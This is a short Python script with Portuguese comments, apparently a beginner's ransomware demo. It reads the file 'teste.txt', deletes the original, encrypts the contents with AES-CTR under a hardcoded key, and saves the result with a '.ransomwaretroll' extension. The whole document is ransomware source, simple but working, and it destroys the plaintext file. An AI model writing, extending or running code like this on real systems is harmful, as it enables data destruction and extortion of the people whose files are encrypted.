import os
import pyaes

## Abrir o arquivo que vai ser criptografado
file_name = "teste.txt"
file = open(file_name, "rb")
file_data = file.read()
file.close()

## Remover o arquivo
os.remove(file_name)

## Chave de criptografia
key = b"testeransomwares"
aes = pyaes.AESModeOfOperationCTR(key)

## Criptografa o arquivo
crypto_data = aes.encrypt(file_data)

## Salva o arquivo criptografado
new_file = file_name + ".ransomwaretroll"
new_file = open(f'{new_file}','wb')
new_file.write(crypto_data)
new_file.close()
